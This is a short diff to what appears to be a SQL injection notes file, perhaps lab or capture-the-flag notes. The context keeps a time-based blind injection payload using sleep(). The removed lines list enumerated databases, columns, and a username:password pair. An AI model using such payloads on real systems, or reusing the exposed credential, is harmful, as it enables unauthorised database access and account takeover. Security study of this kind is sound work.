@@ -88,11 +88,3 @@ Used in the case where database responses are never returned and behavior is inf
 # Time based identification (value before ' must be exist for sleep to succeed, allowing us to identify existing values)
 ' AND IF (1=1, sleep(2),'false') -- //
 ```
-
-Current user: rubben
-Database: postgres | template1 | template0 | glovedb
-Table: public
-
-Columns: active | weight | height | gender | email | created_at
-
-rubben:avrillavigne
